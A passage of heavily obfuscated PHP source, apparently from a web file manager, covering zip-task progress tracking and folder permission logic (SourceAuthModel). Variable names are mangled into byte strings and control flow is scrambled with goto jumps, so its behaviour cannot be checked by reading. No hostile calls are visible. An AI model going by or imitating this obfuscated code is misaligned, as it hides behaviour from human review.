$bŞñƒ¸Ô…[33]; $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1384]] = 0; goto D†‹‰”¨Ü; cèô†¹Ìé£: $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1380]] = $bŞñƒ¸Ô…[33]; $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1387]] = 0; $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[671]] = $CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[78]]; goto dßå˜…’; D†‹‰”¨Ü: $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1285]] = 0; $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1382]] = 0; $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1383]] = 0; goto cèô†¹Ìé£; dßå˜…’: $this->update(); self::log($bŞñƒ¸Ô…[1407] . json_encode(array($CÁƒƒºÚ†º, $CÃŸ‘ÄĞÇß))); goto e‘Ûˆ÷Ë‰˜; e‘Ûˆ÷Ë‰˜: } public function nameParse($e¦‰ãÅÙùÜ) { goto E½¬é¸’÷; FÙ»¤˜˜Ç: $d®²ğÜÌİ› = get_path_this($e¦‰ãÅÙùÜ); if (strstr($d®²ğÜÌİ›, $D…ÉÚŠ±[94])) { $Fç¶ª­¬£³[$D…ÉÚŠ±[1285]] += 1; $Fç¶ª­¬£³[$D…ÉÚŠ±[1280]] += 1; } $Fç¶ª­¬£³[$D…ÉÚŠ±[1380]] = $e¦‰ãÅÙùÜ; goto cÈ·Ë¹©¼ö; cÈ·Ë¹©¼ö: $this->update(); goto aÀÒ¨î‚Åµ; E½¬é¸’÷: $D…ÉÚŠ± =& $_SERVER[‘®…¢À]; $Fç¶ª­¬£³ =& $this->task; if ($Fç¶ª­¬£³[$D…ÉÚŠ±[1405]] == $D…ÉÚŠ±[998]) { $Fç¶ª­¬£³[$D…ÉÚŠ±[1405]] = $D…ÉÚŠ±[298]; $Fç¶ª­¬£³[$D…ÉÚŠ±[1387]] = 0; $Fç¶ª­¬£³[$D…ÉÚŠ±[671]] = 0; } goto FÙ»¤˜˜Ç; aÀÒ¨î‚Åµ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $B¤öíµÆ‘ =& $_SERVER[‘®…¢À]; parent::startAfter(); Hook::bind($B¤öíµÆ‘[1408], array($this, $B¤öíµÆ‘[1403])); $B£ ½ã²–Â =& $this->task; $B£ ½ã²–Â[$B¤öíµÆ‘[1405]] = $B¤öíµÆ‘[998]; if (!$B£ ½ã²–Â[$B¤öíµÆ‘[1234]]) { $B£ ½ã²–Â[$B¤öíµÆ‘[1234]] = LNG($B¤öíµÆ‘[1409]); } } protected function endAfter() { $a‰²İïóì¦ =& $_SERVER[‘®…¢À]; parent::endAfter(); Hook::unbind($a‰²İïóì¦[1408], array($this, $a‰²İïóì¦[1403])); } public function updateAfter() { $DğÒÃ¬¼°‰ =& $_SERVER[‘®…¢À]; $E¼èß‚À =& $this->task; if (!$E¼èß‚À[$DğÒÃ¬¼°‰[1280]] || !$E¼èß‚À[$DğÒÃ¬¼°‰[671]]) { return; } if ($E¼èß‚À[$DğÒÃ¬¼°‰[1405]] == $DğÒÃ¬¼°‰[998]) { $dó±ó³œß = $E¼èß‚À[$DğÒÃ¬¼°‰[1383]]; if ($E¼èß‚À[$DğÒÃ¬¼°‰[1384]] != $DğÒÃ¬¼°‰[998]) { $dó±ó³œß = 0; } $e¸†„½Í“ = ($E¼èß‚À[$DğÒÃ¬¼°‰[1387]] + $dó±ó³œß) / $E¼èß‚À[$DğÒÃ¬¼°‰[671]]; $E¼èß‚À[$DğÒÃ¬¼°‰[1338]] = $e¸†„½Í“ * 0.3; } else { if ($E¼èß‚À[$DğÒÃ¬¼°‰[1405]] == $DğÒÃ¬¼°‰[298]) { $e¸†„½Í“ = $E¼èß‚À[$DğÒÃ¬¼°‰[1285]] / $E¼èß‚À[$DğÒÃ¬¼°‰[1280]]; $E¼èß‚À[$DğÒÃ¬¼°‰[1338]] = 0.3 + $e¸†„½Í“ * 0.5; } else { if ($E¼èß‚À[$DğÒÃ¬¼°‰[1405]] == $DğÒÃ¬¼°‰[92]) { $e¸†„½Í“ = 0; if ($E¼èß‚À[$DğÒÃ¬¼°‰[1382]]) { $e¸†„½Í“ = $E¼èß‚À[$DğÒÃ¬¼°‰[1383]] / $E¼èß‚À[$DğÒÃ¬¼°‰[1382]]; } $E¼èß‚À[$DğÒÃ¬¼°‰[1338]] = 0.3 + 0.5 + $e¸†„½Í“ * 0.2; } } } if ($E¼èß‚À[$DğÒÃ¬¼°‰[1338]] > 0) { $Aó½Ú—Æ‰Ã = timeFloat() - $E¼èß‚À[$DğÒÃ¬¼°‰[1340]] - $E¼èß‚À[$DğÒÃ¬¼°‰[1343]]; $E¼èß‚À[$DğÒÃ¬¼°‰[1344]] = $Aó½Ú—Æ‰Ã * (1 - $E¼èß‚À[$DğÒÃ¬¼°‰[1338]]) / $E¼èß‚À[$DğÒÃ¬¼°‰[1338]]; } } public function copyFileStart($FÀ¿ˆ¶à¿, $BÓÊ«…Šˆø, $DšóÂàİ­ , $bÈ¿êñĞå³, $Aƒ³Û¡„Ê–, $DÀ¾ˆ£õé) { $eÁÛ„ˆ¨Á‰ =& $_SERVER[‘®…¢À]; parent::copyFileStart($FÀ¿ˆ¶à¿, $BÓÊ«…Šˆø, $DšóÂàİ­ , $bÈ¿êñĞå³, $Aƒ³Û¡„Ê–, $DÀ¾ˆ£õé); $C»ŞŠË³Á£ =& $this->task; if ($C»ŞŠË³Á£[$eÁÛ„ˆ¨Á‰[1405]] == $eÁÛ„ˆ¨Á‰[298]) { $C»ŞŠË³Á£[$eÁÛ„ˆ¨Á‰[1405]] = $eÁÛ„ˆ¨Á‰[92]; } $this->update(); } public function copyFileEnd($CëóÏ˜†Ã£, $f¥…»¼¨ß†, $C›ô’¸Õè, $C»¹Õ™‘¥É, $aßâåÕˆ , $DÏ»İÔ‘) { $C¨êòì¿‡Û =& $_SERVER[‘®…¢À]; $b¹×Àğ Ş¦ =& $this->task; $b¹×Àğ Ş¦[$C¨êòì¿‡Û[1383]] = $b¹×Àğ Ş¦[$C¨êòì¿‡Û[1382]]; $b¹×Àğ Ş¦[$C¨êòì¿‡Û[1387]] += $b¹×Àğ Ş¦[$C¨êòì¿‡Û[1382]]; $b¹×Àğ Ş¦[$C¨êòì¿‡Û[1384]] = $C¨êòì¿‡Û[33]; $this->update(); } public function nameParse($C˜„ÂÔ¢¡) { $C—»¦šƒÀ÷ =& $_SERVER[‘®…¢À]; $Aã±Å½©˜ =& $this->task; if ($Aã±Å½©˜[$C—»¦šƒÀ÷[1285]] < $Aã±Å½©˜[$C—»¦šƒÀ÷[1280]]) { $AâÕèÕ±Æ¿ = get_path_this($C˜„ÂÔ¢¡); if (strstr($AâÕèÕ±Æ¿, $C—»¦šƒÀ÷[94])) { $Aã±Å½©˜[$C—»¦šƒÀ÷[1285]] += 1; } } if ($Aã±Å½©˜[$C—»¦šƒÀ÷[1405]] == $C—»¦šƒÀ÷[998]) { $Aã±Å½©˜[$C—»¦šƒÀ÷[1405]] = $C—»¦šƒÀ÷[298]; } $Aã±Å½©˜[$C—»¦šƒÀ÷[1380]] = $C˜„ÂÔ¢¡; $this->update(); } } goto cöâšÍÚ±; fä„·Ÿ×›è: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\143\145\x5f\141\165\164\150"; public function getAuth($EŒÇ·Ë‡í) { goto A¾ÃêŒœ‘–; A¾ÃêŒœ‘–: $B©‹±éŸÃñ =& $_SERVER[‘®…¢À]; $F®š‹Üïî¾ = $B©‹±éŸÃñ[2145]; $BŠä¦¬¿ôÏ = array($B©‹±éŸÃñ[365] => $EŒÇ·Ë‡í); goto DÚËïˆôßÂ; DÚËïˆôßÂ: $dø±·…ğÕÅ = $this->field($F®š‹Üïî¾)->order($B©‹±éŸÃñ[363])->where($BŠä¦¬¿ôÏ)->select(); $BÒˆ³çê™ = array(); foreach ($dø±·…ğÕÅ as $EÜê·³¶ À) { if (Model($B©‹±éŸÃñ[2146])->listData($EÜê·³¶ À[$B©‹±éŸÃñ[2130]])) { $BÒˆ³çê™[] = $EÜê·³¶ À; } } goto DŸÄ•®¯Ç; DŸÄ•®¯Ç: return $BÒˆ³çê™; goto aœğ˜­šôŞ; aœğ˜­šôŞ: } public function setAuth($f©˜ÉÑù™, $bÃ³•÷Üî„) { goto dÍ‹âÜğÛ’; Dê½Ã²Ãß‰: $E«ò…õŒ°à = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $f™©á¢˜« = array(); foreach ($bÃ³•÷Üî„ as $E¶Ê™ŒÔ›) { if (!in_array($E¶Ê™ŒÔ›[$BáÉãò—¡[367]], $E«ò…õŒ°à)) { show_json(LNG($BáÉãò—¡[2147]), !1); } if ($fÆºØš†Àˆ != $E’ÄÕê­Ôº) { if ($E¶Ê™ŒÔ›[$BáÉãò—¡[367]] == SourceModel::TYPE_GROUP) { } if ($E¶Ê™ŒÔ›[$BáÉãò—¡[451]] != 0 && !in_array($E¶Ê™ŒÔ›[$BáÉãò—¡[451]], $Fƒùò«îÖ)) { } } if ($E¶Ê™ŒÔ›[$BáÉãò—¡[451]] == 0) { $E¶Ê™ŒÔ›[$BáÉãò—¡[367]] = SourceModel::TYPE_USER; } $f™©á¢˜«[] = array($BáÉãò—¡[365] => $f©˜ÉÑù™, $BáÉãò—¡[367] => intval($E¶Ê™ŒÔ›[$BáÉãò—¡[367]]), $BáÉãò—¡[451] => intval($E¶Ê™ŒÔ›[$BáÉãò—¡[451]]), $BáÉãò—¡[2130] => intval($E¶Ê™ŒÔ›[$BáÉãò—¡[2130]]) ? intval($E¶Ê™ŒÔ›[$BáÉãò—¡[2130]]) : 0, $BáÉãò—¡[2131] => intval($E¶Ê™ŒÔ›[$BáÉãò—¡[2131]]) ? intval($E¶Ê™ŒÔ›[$BáÉãò—¡[2131]]) : -1); } goto bæÏİ«’ŞÆ; dÍ‹âÜğÛ’: $BáÉãò—¡ =& $_SERVER[‘®…¢À]; $c‚ «ÌÓ£² = Model($BáÉãò—¡[1067])->sourceInfo($f©˜ÉÑù™); if ($c‚ «ÌÓ£²[$BáÉãò—¡[367]] != SourceModel::TYPE_GROUP) { return !1; } goto EÆ¾ÎÜÍ·; bæÏİ«’ŞÆ: $this->where(array($BáÉãò—¡[379] => $f©˜ÉÑù™))->delete(); $this->addAll($f™©á¢˜«); return !0; goto d½ÀğŠìè; EÆ¾ÎÜÍ·: $E’ÄÕê­Ôº = 1; $fÆºØš†Àˆ = $c‚ «ÌÓ£²[$BáÉãò—¡[451]]; if ($fÆºØš†Àˆ != $E’ÄÕê­Ôº) { $D¤ »•ÎÚ = array($BáÉãò—¡[2000] => $fÆºØš†Àˆ); $Fƒùò«îÖ = Model($BáÉãò—¡[2076])->field($BáÉãò—¡[1337])->where($D¤ »•ÎÚ)->select(); $Fƒùò«îÖ = array_to_keyvalue($Fƒùò«îÖ, $BáÉãò—¡[33], $BáÉãò—¡[1337]); } goto Dê½Ã²Ãß‰; d½ÀğŠìè: } public function authClear($B‘õ¢ßÂš) { $A·äÍÕŸ²Ş =& $_SERVER[‘®…¢À]; $c©Úò­Ê = Model($A·äÍÕŸ²Ş[1067])->sourceInfo($B‘õ¢ßÂš); $e¶ÙùÌ›¼ = array($B‘õ¢ßÂš); if ($c©Úò­Ê[$A·äÍÕŸ²Ş[366]] == $A·äÍÕŸ²Ş[84]) { $B¥çôè„Ç¯ = array($A·äÍÕŸ²Ş[516] => array($A·äÍÕŸ²Ş[474], $c©Úò­Ê[$A·äÍÕŸ²Ş[454]] . $B‘õ¢ßÂš . $A·äÍÕŸ²Ş[475])); $e¶ÙùÌ›¼ = Model($A·äÍÕŸ²Ş[1067])->field($A·äÍÕŸ²Ş[379])->where($B¥çôè„Ç¯)->getField($A·äÍÕŸ²Ş[365], !0); $e¶ÙùÌ›¼[] = $B‘õ¢ßÂš; } $this->where(array($A·äÍÕŸ²Ş[379] => array($A·äÍÕŸ²Ş[380], $e¶ÙùÌ›¼)))->delete(); return !0; } public function get($eäìµâšÔŠ) { $DÉóßäåä„ = $this->getSourceList(array($eäìµâšÔŠ), !0); return $DÉóßäåä„[0]; } public function getSourceList($Eô­ñßòÇ, $cÏ‹ˆå­Ãö = false) { goto EÃ»½Ò¬í; b°±‚È÷µ»: $fö‰ËµŞëœ = array_values(array_unique($fö‰ËµŞëœ)); if (!$fö‰ËµŞëœ) { return array(); } $E…»Ô¢ç¥Î = $DòñŞí¶éª[2149]; goto E‰Ú³ÍÖÄ; E‰Ú³ÍÖÄ: $BõÜ‹Ú¤Ûğ = array($DòñŞí¶éª[379] => array($DòñŞí¶éª[380], $fö‰ËµŞëœ)); $AÑÈÆÉ¹ğë = $this->field($E…»Ô¢ç¥Î)->where($BõÜ‹Ú¤Ûğ)->select(); $AÑÈÆÉ¹ğë = array_to_keyvalue_group($AÑÈÆÉ¹ğë, $DòñŞí¶éª[365]); goto EÀ¸’Ô‰Ìø; EÃ»½Ò¬í: $DòñŞí¶éª =& $_SERVER[‘®…¢À]; if (!$Eô­ñßòÇ) { return array(); } $FºŸÁÄ§å• = Model($DòñŞí¶éª[1067]); goto cŸ‡À¸İ; EÀ¸’Ô‰Ìø: $Cô÷î’Ù•Ö = array(); foreach ($cÏ‹ˆå­Ãö as $a¹Ë¬‹ê¨ => $CİŞöÀ‰Èã) { $Cô÷î’Ù•Ö[$a¹Ë¬‹ê¨] = $this->makeSourceAuth($CİŞöÀ‰Èã, $AÑÈÆÉ¹ğë); } return $Cô÷î’Ù•Ö; goto E¡é£·µš; cŸ‡À¸İ: if (!$cÏ‹ˆå­Ãö) { $BõÜ‹Ú¤Ûğ = array($DòñŞí¶éª[379] => array($DòñŞí¶éª[380], $Eô­ñßòÇ)); $cÏ‹ˆå­Ãö = $FºŸÁÄ§å•->field($DòñŞí¶éª[2148])->where($BõÜ‹Ú¤Ûğ)->select(); $cÏ‹ˆå­Ãö = array_to_keyvalue($cÏ‹ˆå­Ãö, $DòñŞí¶éª[365]); } $fö‰ËµŞëœ = $Eô­ñßòÇ; foreach ($cÏ‹ˆå­Ãö as $E¢¹Äí§Õ‰ => $F‚õ›êÇÂÌ) { $B¶£„ İ¬ = $FºŸÁÄ§å•->parentLevelArray($F‚õ›êÇÂÌ[$DòñŞí¶éª[454]]); $fö‰ËµŞëœ = array_merge($fö‰ËµŞëœ, $B¶£„ İ¬, array($E¢¹Äí§Õ‰)); } goto b°±‚È÷µ»; E¡é£·µš: } public function authDeepCheck($fáİÁ˜äŒ°, $F­‰Ÿç = false) { $dç½¹ò‘Ô =& $_SERVER[‘®…¢À]; if (_get($GLOBALS, $dç½¹ò‘Ô[452])) { return !1; } $F¬–­ë•šë = $this->makeAuthDeep(); if (!in_array($fáİÁ˜äŒ°, $F¬–­ë•šë)) { return !1; } return array($dç½¹ò‘Ô[373] => -1, $dç½¹ò‘Ô[413] => array($dç½¹ò‘Ô[381] => $dç½¹ò‘Ô[989], $dç½¹ò‘Ô[2006] => $dç½¹ò‘Ô[463], $dç½¹ò‘Ô[382] => LNG($dç½¹ò‘Ô[2150]), $dç½¹ò‘Ô[2018] => $dç½¹ò‘Ô[2151])); } protected function makeAuthDeep() { goto BºÔ£ŞÊ†‹; bÁ‰¸¼˜‚: $FĞÌçïÏ  = array_to_keyvalue($bÜÑšã¹ç, $fÙä§»ï½ù[33], $fÙä§»ï½ù[365]); $FÒ¿šæÓ¾ = array(); $cÊ£°“ùÎ = $Dµ¡÷–ª§; goto Bîª©ÄìŞƒ; e²Õèˆ¸­À: $Dµ¡÷–ª§ = Session::get($fÙä§»ï½ù[2114]); $Dµ¡÷–ª§ = array_to_keyvalue($Dµ¡÷–ª§, $fÙä§»ï½ù[33], $fÙä§»ï½ù[2000]); $C¿Ä˜¾¼± = array($fÙä§»ï½ù[367] => SourceModel::TYPE_USER, $fÙä§»ï½ù[451] => USER_ID); goto f·Î°èÚö; BºÔ£ŞÊ†‹: $fÙä§»ï½ù =& $_SERVER[‘®…¢À]; static $FÒ¿šæÓ¾ = false; if ($FÒ¿šæÓ¾) { return $FÒ¿šæÓ¾; } goto D†å¨Ì«­“; f·Î°èÚö: if ($Dµ¡÷–ª§) { $C¿Ä˜¾¼± = array(array($fÙä§»ï½ù[367] => SourceModel::TYPE_USER, $fÙä§»ï½ù[451] => USER_ID), array($fÙä§»ï½ù[367] => SourceModel::TYPE_GROUP, $fÙä§»ï½ù[451] => array($fÙä§»ï½ù[380], $Dµ¡÷–ª§)), $fÙä§»ï½ù[895] => $fÙä§»ï½ù[2082]); } if ($DöÄö…ğ¶‘) { $C¿Ä˜¾¼± = array($C¿Ä˜¾¼±, $fÙä§»ï½ù[2130] => array($fÙä§»ï½ù[2153], $DöÄö…ğ¶‘)); } $bÜÑšã¹ç = $this->field($fÙä§»ï½ù[2154])->where($C¿Ä˜¾¼±)->select(); goto bÁ‰¸¼˜‚; bÂ¤á‰‚Ã‡: $cÊ£°“ùÎ = array_values(array_unique($cÊ£°“ùÎ)); foreach ($cÊ£°“ùÎ as $fŠÅÂ­ªŒº) { $BÙ§¯Ü‰‹ƒ = $FóáàÛ†Æë->getInfo($fŠÅÂ­ªŒº); $FÒ¿šæÓ¾[] = $BÙ§¯Ü‰‹ƒ[$fÙä§»ï½ù[387]][$fÙä§»ï½ù[365]]; } $FÒ¿šæÓ¾ = array_values(array_unique($FÒ¿šæÓ¾)); goto f¦×Ì°„é«; f¦×Ì°„é«: return $FÒ¿šæÓ¾; goto c¢ŒÍÄîå; AÌ¨­“äÜä: $cÊ£°“ùÎ = array_values(array_unique($cÊ£°“ùÎ)); $CæŒ¦ºÈäË = $cÊ£°“ùÎ; foreach ($CæŒ¦ºÈäË as $fŠÅÂ­ªŒº) { $BÙ§¯Ü‰‹ƒ = $FóáàÛ†Æë->getInfo($fŠÅÂ­ªŒº); $c˜Æçˆ¡±‡ = $E“ã¬±²->parentLevelArray($BÙ§¯Ü‰‹ƒ[$fÙä§»ï½ù[454]]); $cÊ£°“ùÎ = array_merge($cÊ£°“ùÎ, $c˜Æçˆ¡±‡); } goto bÂ¤á‰‚Ã‡; Bîª©ÄìŞƒ: $E“ã¬±² = Model($fÙä§»ï½ù[1067]); $FóáàÛ†Æë = Model($fÙä§»ï½ù[453]); if ($FĞÌçïÏ ) { $CÄÉ‘Æ™® = $E“ã¬±²->where(array($fÙä§»ï½ù[365] => array($fÙä§»ï½ù[380], $FĞÌçïÏ )))->select(); foreach ($CÄÉ‘Æ™® as $FÇßÆÛÌ©) { $c˜Æçˆ¡±‡ = $E“ã¬±²->parentLevelArray($FÇßÆÛÌ©[$fÙä§»ï½ù[454]]); $FÒ¿šæÓ¾ = array_merge($FÒ¿šæÓ¾, $c˜Æçˆ¡±‡); $cÊ£°“ùÎ[] = $FÇßÆÛÌ©[$fÙä§»ï½ù[451]]; } } goto AÌ¨­“äÜä; D†å¨Ì«­“: $e¦ƒ¢”¿³ï = Model($fÙä§»ï½ù[2152])->listData(); $DöÄö…ğ¶‘ = array(); foreach ($e¦ƒ¢”¿³ï as $BÁÂöì÷†ã) { if ($BÁÂöì÷†ã[$fÙä§»ï½ù[372]] == 0 && $BÁÂöì÷†ã[$fÙä§»ï½ù[2020]] == $fÙä§»ï½ù[84]) { $DöÄö…ğ¶‘[] = $BÁÂöì÷†ã[$fÙä§»ï½ù[363]]; } } goto e²Õèˆ¸­À; c¢ŒÍÄîå: } private function makeSourceAuth($bÒ§Û¦ĞºÓ, $Eï™µõƒ ò) { goto AÃËÔ›ô”; d¤‘ïºÂŒæ: $c™·ÑÁŞ™â = array_merge(array($bÒ§Û¦ĞºÓ[$A–ãÒõñ¤[365]]), array_reverse($c™·ÑÁŞ™â)); $câùó¡Å‘Ö = !1; foreach ($c™·ÑÁŞ™â as $b¼õ¥â¼à) { if (!isset($Eï™µõƒ ò[$b¼õ¥â¼à])) { continue; } $C‚“×İˆœ… = $this->authMake($Eï™µõƒ ò[$b¼õ¥â¼à]); if ($C‚“×İˆœ…[$A–ãÒõñ¤[413]]) { $câùó¡Å‘Ö = $C‚“×İˆœ…; break; } } goto Få•‰¨“İ; Få•‰¨“İ: if (!$câùó¡Å‘Ö) { $fïÊëçÌÜ = array_to_keyvalue($fïÊëçÌÜ, $A–ãÒõñ¤[2000]); $Bà‚¥‰¬ = $bÒ§Û¦ĞºÓ[$A–ãÒõñ¤[451]]; $a³ñ“§œç = isset($fïÊëçÌÜ[$Bà‚¥‰¬]) ? $fïÊëçÌÜ[$Bà‚¥‰¬] : !1; if ($a³ñ“§œç) { $câùó¡Å‘Ö = array($A–ãÒõñ¤[2155] => intval($a³ñ“§œç[$A–ãÒõñ¤[372]][$A–ãÒõñ¤[372]]), $A–ãÒõñ¤[2156] => $a³ñ“§œç[$A–ãÒõñ¤[372]]); } } if ((!$câùó¡Å‘Ö || $câùó¡Å‘Ö[$A–ãÒõñ¤[373]] <= 0) && $bÒ§Û¦ĞºÓ[$A–ãÒõñ¤[367]] == SourceModel::TYPE_GROUP) { $Cõ•ôøÉÜç = $this->authDeepCheck($bÒ§Û¦ĞºÓ[$A–ãÒõñ¤[365]], $câùó¡Å‘Ö); if ($Cõ•ôøÉÜç) { $câùó¡Å‘Ö = $Cõ•ôøÉÜç; } } return $câùó¡Å‘Ö; goto d‰ÔÅÌŠ†¥; AÃËÔ›ô”: $A–ãÒõñ¤ =& $_SERVER[‘®…¢À]; $fïÊëçÌÜ = Session::get($A–ãÒõñ¤[2114]); $c™·ÑÁŞ™â = Model($A–ãÒõñ¤[1067])->parentLevelArray($bÒ§Û¦ĞºÓ[$A–ãÒõñ¤[454]]); goto d¤‘ïºÂŒæ; d‰ÔÅÌŠ†¥: } public function authOwnerApply($Fí¼Î“Ş«Ò) { goto cÖ¹ˆìá”Ì; FãÏœññËõ: $Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[372]][$e£Å÷í‰Ï[2159]] = Model($e£Å÷í‰Ï[465])->userListInfo($fÓºó¶êî„); return $Fí¼Î“Ş«Ò; goto c˜öåôô˜ù; A«­Ôï¥„: $D¿¶¸é‚ƒ = array($e£Å÷í‰Ï[379] => array($e£Å÷í‰Ï[380], $E‘ƒ»ª¾…‰)); $fî£¬²Ì•  = $this->field($CÇ¹íˆŒêŠ)->where($D¿¶¸é‚ƒ)->select(); $fî£¬²Ì•  = array_to_keyvalue_group($fî£¬²Ì• , $e£Å÷í‰Ï[365]); goto B¢“Ñ—Í‚°; cÎŸ°ª˜Ã : if (count($fÓºó¶êî„) == 0) { $fÓºó¶êî„ = $this->authFolderOwnerGroup($Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[451]]); } $fÓºó¶êî„ = array_unique($fÓºó¶êî„); if (AuthModel::authCheckRoot($Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[372]][$e£Å÷í‰Ï[373]])) { $fÓºó¶êî„[] = USER_ID; } goto FãÏœññËõ; CæÜ¶¸ŠÁ: $E‘ƒ»ª¾…‰ = Model($e£Å÷í‰Ï[1067])->parentLevelArray($Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[454]]); $E‘ƒ»ª¾…‰ = array_merge(array($Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[365]]), array_reverse($E‘ƒ»ª¾…‰)); $CÇ¹íˆŒêŠ = $e£Å÷í‰Ï[2149]; goto A«­Ôï¥„; B¢“Ñ—Í‚°: $DØŒ²æ“ ò = array(); $fÓºó¶êî„ = array(); foreach ($fî£¬²Ì•  as $eêï‹µ§Î¯ => $bäè‡¤ÙË³) { $DŒ‘È±Ö«‰ = $this->authFolderOwnerUser($bäè‡¤ÙË³); $DØŒ²æ“ ò[$eêï‹µ§Î¯] = $DŒ‘È±Ö«‰; $fÓºó¶êî„ = array_merge($fÓºó¶êî„, $DŒ‘È±Ö«‰[$e£Å÷í‰Ï[526]]); if ($DŒ‘È±Ö«‰[$e£Å÷í‰Ï[2158]]) { break; } } goto cÎŸ°ª˜Ã ; cÖ¹ˆìá”Ì: $e£Å÷í‰Ï =& $_SERVER[‘®…¢À]; if (empty($Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[372]]) || isset($Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[2157]]) && $Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[2157]]) { return $Fí¼Î“Ş«Ò; } if (AuthModel::authCheckRoot($Fí¼Î“Ş«Ò[$e£Å÷í‰Ï[372]][$e£Å÷í‰Ï[373]])) { return $Fí¼Î“Ş«Ò; } goto CæÜ¶¸ŠÁ; c˜öåôô˜ù: } private function authFolderOwnerGroup($B°ñö‰‡ˆª) { $aÏóÄ¡Â‘ =& $_SERVER[‘®…¢À]; $BÚø¦«”øÂ = Model($aÏóÄ¡Â‘[2076])->where(array($aÏóÄ¡Â‘[2000] => $B°ñö‰‡ˆª))->select(); $EÒÇÄ‡ğÕ» = array(); if (!$BÚø¦«”øÂ) { return $EÒÇÄ‡ğÕ»; } foreach ($BÚø¦«”øÂ as $EíÑÀ„Ë‡) { $c¹¤ºùš® = $this->authInfo($EíÑÀ„Ë‡); if (AuthModel::authCheckRoot($c¹¤ºùš®[$aÏóÄ¡Â‘[372]])) { $EÒÇÄ‡ğÕ»[] = $EíÑÀ„Ë‡[$aÏóÄ¡Â‘[1337]]; } } return $EÒÇÄ‡ğÕ»; } private function authFolderOwnerUser($d÷Éò“£Áº) { $b…À¥íİàš =& $_SERVER[‘®…¢À]; $D¼º·²Ú‚é = array(); $c—¾Ïœ¼‡¤ = !1; foreach ($d÷Éò“£Áº as $B½«­çÀøŸ) { $Cƒ­‡ˆé‘á = $this->authInfo($B½«­çÀøŸ); if ($B½«­çÀøŸ[$b…À¥íİàš[451]] == $b…À¥íİàš[463]) { $c—¾Ïœ¼‡¤ = !0; } if ($B½«­çÀøŸ[$b…À¥íİàš[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Cƒ­‡ˆé‘á[$b…À¥íİàš[372]])) { $D¼º·²Ú‚é[] = $B½«­çÀøŸ[$b…À¥íİàš[451]]; } } } return array($b…À¥íİàš[526] => $D¼º·²Ú‚é, $b…À¥íİàš[2158] => $c—¾Ïœ¼‡¤); } public function authMake($c—¼‹ß¤¼) { goto f†ÍïµÁØ; c•ÊŸÕ“’: $A³Şâ‘›Æˆ = $DÌ¶àÛÅïÓ ? $FæŠ³ãå£î : ($dÇãéŠ‘¥ ? $e¾¶Ïô¹‹… : $Bˆ›æõ¿İŠ); $e ´ó÷‡¿ê = array($A£àŒÁŠĞª[2155] => intval($dİ×è²Áñí), $A£àŒÁŠĞª[2156] => $A³Şâ‘›Æˆ); return $e ´ó÷‡¿ê; goto Bëô«å¨²‡; bøÆ•â÷ñ: $B Õ†ÒÜ = 0; foreach ($c—¼‹ß¤¼ as $Aï¯ö’¹…é) { $A³Şâ‘›Æˆ = $this->authInfo($Aï¯ö’¹…é); $a¦¿­çÙ©‘ = $Aï¯ö’¹…é[$A£àŒÁŠĞª[451]]; $açáîÑˆ¯‰ = intval($A³Şâ‘›Æˆ[$A£àŒÁŠĞª[372]]); if ($Aï¯ö’¹…é[$A£àŒÁŠĞª[367]] == SourceModel::TYPE_USER && $a¦¿­çÙ©‘ == USER_ID) { $DÌ¶àÛÅïÓ = !0; $FæŠ³ãå£î = $A³Şâ‘›Æˆ; $BŸõÛÆ’º– = $açáîÑˆ¯‰; } else { if ($Aï¯ö’¹…é[$A£àŒÁŠĞª[367]] == SourceModel::TYPE_GROUP && in_array($a¦¿­çÙ©‘, $A¤ºƒÂ„±)) { $dÇãéŠ‘¥ = !0; if ($açáîÑˆ¯‰ >= $FèÑ‡ÄÀ) { $FèÑ‡ÄÀ = $açáîÑˆ¯‰; $e¾¶Ïô¹‹… = $A³Şâ‘›Æˆ; } } else { if ($a¦¿­çÙ©‘ == $A£àŒÁŠĞª[463]) { $B Õ†ÒÜ = !0; $Bˆ›æõ¿İŠ = $A³Şâ‘›Æˆ; $Aš·Š²Ø÷» = $açáîÑˆ¯‰; } } } } $dİ×è²Áñí = $DÌ¶àÛÅïÓ ? $BŸõÛÆ’º– : ($dÇãéŠ‘¥ ? $FèÑ‡ÄÀ : $Aš·Š²Ø÷»); goto c•ÊŸÕ“’; AÆÛğ‰ÛÊ—: $Bˆ›æõ¿İŠ = 0; $DÌ¶àÛÅïÓ = 0; $dÇãéŠ‘¥ = 0; goto bøÆ•â÷ñ; fÛç½ä®: $A¤ºƒÂ„± = array_to_keyvalue($aÛé™²ĞÜ, $A£àŒÁŠĞª[33], $A£àŒÁŠĞª[2000]); $BŸõÛÆ’º– = 0; $FèÑ‡ÄÀ = 0; goto c·ä«í“œ; f†ÍïµÁØ: $A£àŒÁŠĞª =& $_SERVER[‘®…¢À]; if (!$c—¼‹ß¤¼) { return array($A£àŒÁŠĞª[373] => 0, $A£àŒÁŠĞª[413] => !1); } $aÛé™²ĞÜ = Session::get($A£àŒÁŠĞª[2114]); goto fÛç½ä®; c·ä«í“œ: $Aš·Š²Ø÷» = 0; $FæŠ³ãå£î = 0; $e¾¶Ïô¹‹… = 0; goto AÆÛğ‰ÛÊ—; Bëô«å¨²‡: } public function authTargetInfoMake($bÆ¸Ç‘ÂÅ¬) { goto cØ¾¤ßÌé; eÏ°Ä°Ü’£: return array($d­³Ÿ£Çƒ¯[2160] => $Bµô’¿¶ÑÏ, $d­³Ÿ£Çƒ¯[2161] => $a÷°ÜğÚ’µ); goto BÙºÆƒº‚; cØ¾¤ßÌé: $d­³Ÿ£Çƒ¯ =& $_SERVER[‘®…¢À]; $Bµô’¿¶ÑÏ = array(); $a÷°ÜğÚ’µ 